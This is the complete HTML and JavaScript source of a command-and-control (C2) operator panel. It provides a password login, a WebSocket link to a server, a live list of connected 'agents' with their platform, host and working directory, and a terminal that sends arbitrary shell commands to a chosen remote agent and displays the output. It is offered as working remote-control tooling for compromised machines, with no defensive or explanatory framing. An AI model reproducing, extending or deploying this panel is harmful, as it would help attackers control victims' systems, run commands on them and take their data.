<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Panel</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bg:#080808;--bg2:#0f0f0f;--bg3:#161616;--border:#1e1e1e;
    --green:#00ff88;--green2:#00cc6a;--red:#ff4444;--yellow:#ffcc00;
    --text:#c8c8c8;--dim:#555;--font:'Courier New',monospace;
  }
  body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:13px;height:100vh;overflow:hidden}

  /* ── LOGIN ── */
  #login{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:16px}
  #login h1{color:var(--green);font-size:22px;letter-spacing:4px}
  #login input{background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:10px 14px;width:260px;font-family:var(--font);font-size:13px;outline:none}
  #login input:focus{border-color:var(--green)}
  #login button{background:var(--green);color:#000;border:none;padding:10px 24px;font-family:var(--font);font-size:13px;cursor:pointer;font-weight:bold;width:260px}
  #login button:hover{background:var(--green2)}
  #login .err{color:var(--red);font-size:12px}

  /* ── MAIN ── */
  #main{display:none;height:100vh;flex-direction:column}
  .topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;justify-content:space-between}
  .topbar .logo{color:var(--green);font-weight:bold;letter-spacing:3px}
  .topbar .status{font-size:11px;color:var(--dim)}
  .topbar .status span{color:var(--green)}

  .body{display:flex;flex:1;overflow:hidden}

  /* ── SIDEBAR ── */
  .sidebar{width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column}
  .sidebar-title{padding:10px 12px;color:var(--dim);font-size:11px;letter-spacing:2px;border-bottom:1px solid var(--border)}
  .agent-list{flex:1;overflow-y:auto}
  .agent-item{padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s}
  .agent-item:hover{background:var(--bg3)}
  .agent-item.active{background:var(--bg3);border-left:2px solid var(--green)}
  .agent-item .aid{color:var(--green);font-size:12px;font-weight:bold}
  .agent-item .ameta{color:var(--dim);font-size:11px;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .agent-item .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:5px;animation:pulse 2s infinite}
  .agent-item.dead .dot{background:var(--red);animation:none}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

  /* ── TERMINAL ── */
  .terminal{flex:1;display:flex;flex-direction:column;background:var(--bg)}
  .term-header{padding:8px 16px;border-bottom:1px solid var(--border);background:var(--bg2);display:flex;align-items:center;gap:10px}
  .term-header .agent-id{color:var(--green);font-weight:bold}
  .term-header .agent-info{color:var(--dim);font-size:11px}
  .output{flex:1;overflow-y:auto;padding:12px 16px;line-height:1.6}
  .output .line{margin-bottom:3px;word-break:break-all}
  .output .line.cmd{color:var(--green)}
  .output .line.res{color:var(--text)}
  .output .line.err{color:var(--red)}
  .output .line.sys{color:var(--yellow)}
  .output .ts{color:var(--dim);font-size:11px;margin-right:8px}
  .input-row{display:flex;border-top:1px solid var(--border);background:var(--bg2)}
  .input-row .prompt{padding:10px 12px;color:var(--green);white-space:nowrap}
  .input-row input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:13px;padding:10px 0;outline:none}
  .input-row button{background:var(--green);color:#000;border:none;padding:10px 18px;font-family:var(--font);cursor:pointer;font-weight:bold}
  .input-row button:hover{background:var(--green2)}

  .no-agent{flex:1;display:flex;align-items:center;justify-content:center;color:var(--dim);flex-direction:column;gap:8px}
  .no-agent .big{font-size:32px}
  .scrollbar-thin::-webkit-scrollbar{width:4px}
  .scrollbar-thin::-webkit-scrollbar-track{background:var(--bg)}
  .scrollbar-thin::-webkit-scrollbar-thumb{background:var(--border)}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="login">
  <h1>[ C2 ]</h1>
  <input id="pass" type="password" placeholder="password" autofocus>
  <button onclick="doLogin()">CONNECT</button>
  <div class="err" id="lerr"></div>
</div>

<!-- MAIN -->
<div id="main">
  <div class="topbar">
    <div class="logo">[ C2 PANEL ]</div>
    <div class="status">ws: <span id="wsStatus">connecting…</span> &nbsp;|&nbsp; agents: <span id="agentCount">0</span></div>
  </div>
  <div class="body">
    <div class="sidebar">
      <div class="sidebar-title">AGENTS</div>
      <div class="agent-list scrollbar-thin" id="agentList"></div>
    </div>
    <div class="terminal" id="terminal">
      <div class="no-agent">
        <div class="big">⬛</div>
        <div>select an agent</div>
      </div>
    </div>
  </div>
</div>

<script>
let ws, currentAgent = null;
const agents  = {};
const outputs = {};

// ── LOGIN ────────────────────────────────────────
async function doLogin() {
  const pass = document.getElementById('pass').value;
  const r = await fetch('/api/login', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({password:pass})
  });
  const d = await r.json();
  if (d.ok) {
    document.getElementById('login').style.display='none';
    document.getElementById('main').style.display='flex';
    connectWS();
  } else {
    document.getElementById('lerr').textContent = 'wrong password';
  }
}
document.getElementById('pass').addEventListener('keydown', e => {
  if (e.key==='Enter') doLogin();
});

// ── WEBSOCKET ────────────────────────────────────
function connectWS() {
  const proto = location.protocol==='https:' ? 'wss' : 'ws';
  ws = new WebSocket(`${proto}://${location.host}`);

  ws.onopen  = () => setStatus('connected', 'var(--green)');
  ws.onclose = () => { setStatus('disconnected', 'var(--red)'); setTimeout(connectWS,3000); };
  ws.onerror = () => setStatus('error', 'var(--red)');

  ws.onmessage = e => {
    const msg = JSON.parse(e.data);
    if      (msg.type==='init')         handleInit(msg);
    else if (msg.type==='connected')    handleConnected(msg);
    else if (msg.type==='disconnected') handleDisconnected(msg);
    else if (msg.type==='result')       handleResult(msg);
    else if (msg.type==='heartbeat')    handleHeartbeat(msg);
  };
}

function setStatus(text, color) {
  const el = document.getElementById('wsStatus');
  el.textContent = text;
  el.style.color = color;
}

// ── MESSAGE HANDLERS ─────────────────────────────
function handleInit(msg) {
  for (const a of msg.agents) registerAgent(a);
  renderAgentList();
  document.getElementById('agentCount').textContent = Object.keys(agents).length;
}

function handleConnected(msg) {
  registerAgent(msg.agent);
  renderAgentList();
  document.getElementById('agentCount').textContent = Object.keys(agents).length;
  sysLine(msg.agent.id, `agent ${msg.agent.id} connected`);
}

function handleDisconnected(msg) {
  if (agents[msg.agentId]) {
    agents[msg.agentId].dead = true;
    renderAgentList();
    sysLine(msg.agentId, `agent ${msg.agentId} timed out`);
  }
  document.getElementById('agentCount').textContent =
    Object.values(agents).filter(a=>!a.dead).length;
}

function handleResult(msg) {
  const { agentId, data } = msg;
  if (!outputs[agentId]) return;
  if (data.error) {
    appendLine(agentId, 'err', data.error);
  } else {
    const out = data.result || data.output || JSON.stringify(data);
    appendLine(agentId, 'res', out);
  }
}

function handleHeartbeat(msg) {
  if (agents[msg.agentId]) {
    agents[msg.agentId].lastSeen = msg.ts;
  }
}

// ── AGENTS ───────────────────────────────────────
function registerAgent(a) {
  agents[a.id] = a;
  if (!outputs[a.id]) outputs[a.id] = [];
}

function renderAgentList() {
  const list = document.getElementById('agentList');
  list.innerHTML = '';
  for (const [id, a] of Object.entries(agents)) {
    const div = document.createElement('div');
    div.className = 'agent-item' + (a.dead?' dead':'') + (currentAgent===id?' active':'');
    div.innerHTML = `
      <div class="aid"><span class="dot"></span>${id}</div>
      <div class="ameta">${(a.info?.platform||'unknown')} | ${(a.info?.node||'?')}</div>
    `;
    div.onclick = () => selectAgent(id);
    list.appendChild(div);
  }
}

function selectAgent(id) {
  currentAgent = id;
  renderAgentList();
  renderTerminal(id);
}

// ── TERMINAL ─────────────────────────────────────
function renderTerminal(id) {
  const a = agents[id];
  const term = document.getElementById('terminal');
  term.innerHTML = `
    <div class="term-header">
      <div class="agent-id">${id}</div>
      <div class="agent-info">${a.info?.platform||''} | ${a.info?.node||''} | cwd: ${a.info?.cwd||'?'}</div>
    </div>
    <div class="output scrollbar-thin" id="out_${id}"></div>
    <div class="input-row">
      <div class="prompt">[ ${id} ] $</div>
      <input id="cmd_${id}" type="text" placeholder="shell command…" autocomplete="off">
      <button onclick="sendCmd('${id}')">RUN</button>
    </div>
  `;

  // replay logs
  for (const entry of (outputs[id]||[])) {
    const el = document.getElementById(`out_${id}`);
    if (el) _appendToEl(el, entry.cls, entry.text, entry.ts);
  }

  document.getElementById(`cmd_${id}`).addEventListener('keydown', e => {
    if (e.key==='Enter') sendCmd(id);
  });
}

function sendCmd(id) {
  const inp = document.getElementById(`cmd_${id}`);
  if (!inp) return;
  const raw = inp.value.trim();
  if (!raw) return;
  inp.value = '';

  appendLine(id, 'cmd', '$ ' + raw);

  let type, args;
  if (raw==='ping')               { type='ping';    args={}; }
  else if (raw.startsWith('ls'))  { type='ls';      args={path: raw.split(' ')[1]||'.'}; }
  else if (raw.startsWith('cd ')) { type='cd';      args={path: raw.slice(3).trim()}; }
  else                            { type='shell';   args={cmd: raw}; }

  ws.send(JSON.stringify({ type:'exec', agentId:id, cmdType:type, args }));
}

// ── LOGGING ──────────────────────────────────────
function appendLine(agentId, cls, text, ts=null) {
  const entry = { cls, text, ts: ts||new Date().toLocaleTimeString() };
  if (!outputs[agentId]) outputs[agentId] = [];
  outputs[agentId].push(entry);

  if (currentAgent===agentId) {
    const el = document.getElementById(`out_${agentId}`);
    if (el) {
      _appendToEl(el, entry.cls, entry.text, entry.ts);
      el.scrollTop = el.scrollHeight;
    }
  }
}

function sysLine(agentId, text) {
  appendLine(agentId, 'sys', '── ' + text + ' ──');
}

function _appendToEl(el, cls, text, ts) {
  const div = document.createElement('div');
  div.className = `line ${cls}`;
  div.innerHTML = `<span class="ts">${ts}</span>${escHtml(text)}`;
  el.appendChild(div);
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
</script>
</body>
</html>
